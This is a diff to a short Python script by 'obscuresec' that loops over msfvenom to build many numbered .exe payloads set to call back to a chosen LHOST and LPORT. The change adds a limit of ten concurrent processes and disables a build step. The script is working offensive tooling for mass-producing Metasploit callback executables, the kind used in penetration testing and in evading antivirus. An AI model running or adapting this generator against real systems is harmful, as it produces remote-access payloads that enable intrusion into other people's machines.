@@ -6,6 +6,7 @@
 #
 # by Chris Campbell (obscuresec)
 # original idea from Skip Duckwall (passingthehash)
+import os
 import sys
 import subprocess
 
@@ -23,10 +24,15 @@ def build(payload,lhost,lport):
 
 #generate payloads with msfvenom
 def gen(payload,lhost,lport,num):
-    for x in range(0, int(num)):
+    processes = set()
+    max_processes = 10
+    for x in range(0, int(num)):      
         filename = "payload_%s_%s" % (lport,x)
         venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s" % (payload,lhost,lport,filename)
-        subprocess.Popen(venom, shell=True)
+        processes.add(subprocess.Popen(venom, shell=True))
+        if len(processes) >= max_processes:
+            os.wait()
+            processes.difference_update(p for p in processes if p.poll() is not None)
 
 #grab args
 try:    
@@ -34,9 +40,9 @@ try:
     lhost = sys.argv[2]
     lport = sys.argv[3]
     num = sys.argv[4]
-	
+
     gen(payload,lhost,lport,num)
-    build(payload,lhost,lport)
+    #build(payload,lhost,lport)
 
 #index error
 except IndexError:
